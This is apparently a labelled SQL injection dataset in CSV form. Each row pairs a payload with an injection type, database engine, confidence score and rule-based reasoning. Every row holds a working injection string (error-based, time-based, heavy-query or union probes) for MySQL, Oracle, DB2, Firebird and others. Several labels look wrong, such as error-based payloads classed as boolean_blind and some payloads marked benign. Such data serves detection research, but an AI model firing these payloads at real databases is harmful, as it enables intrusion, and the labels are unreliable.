id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18313,"1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,co""",2
18314,1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: '1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) |'",3
18315,1'|| ( select 'fwph' where 3791 = 3791,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'fwph' where 3791 = 3791""",3
18316,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( sele""",2
18317,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'tvcy' where 5592 = 5592 order by 1#""",3
18318,"1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,""",1
18319,"1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558'",2
18320,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns'",1
18321,"-7416"" where 7656 = 7656 order by 1--",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '-7416"" where 7656 = 7656 order by 1--'",2
18322,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_'",3
18323,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre""",2
18324,"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.colum""",1
18325,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'eugs' = 'eugs",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: ""1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 =""",2
18326,"1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: '1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1'",1
18327,( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7812 = 7812 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) from dual ),boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: '( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || '",3
18328,"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: ""1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x71""",2
18329,"1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( selec'",2
18330,"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",union_based,oracle,0.95,"Token 'UNION SELECT' → union_based (priority 7); DB=oracle via dual. Payload contains: ""1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null""",3
18331,end and ( ( 'eqoc' like 'eqoc,benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: ""end and ( ( 'eqoc' like 'eqoc""",2
18332,1' ) as lewd where 3118 = 3118 order by 1--,benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: ""1' ) as lewd where 3118 = 3118 order by 1--""",2
18333,"1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select""",2
18334,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,oracle,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=oracle via dual. Payload contains: ""1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * )""",1
18335,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1'",2
18336,1'|| ( select 'omeg' from dual where 4751 = 4751,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'omeg' from dual where 4751 = 4751""",3
18337,"1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: ""1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,""",2
18338,"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as s""",1
18339,"1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: '1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.sys'",1
18340,"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,Token 'nested cross-join count' → heavy_query (priority 4); DB=firebird via rdb$/gen_id. Payload contains: '1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as',1
18341,1'|| ( select 'gved' from dual where 6965 = 6965,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'gved' from dual where 6965 = 6965""",3
18342,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select (""",2
18343,"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""igop"" = ""igop",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 180'",2
